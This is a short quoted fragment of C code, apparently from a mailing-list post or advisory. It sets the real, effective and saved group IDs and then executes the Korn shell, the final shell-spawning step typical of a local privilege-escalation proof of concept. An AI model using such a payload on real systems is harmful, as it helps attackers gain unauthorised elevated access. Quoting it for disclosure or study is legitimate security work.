&gt;     if (setresgid(sgid, sgid, sgid) != 0) _exit(__LINE__);
&gt;     char * const argv[] = { _PATH_KSHELL, NULL };
&gt;     execve(argv[0], argv, NULL);
&gt;     _exit(__LINE__);
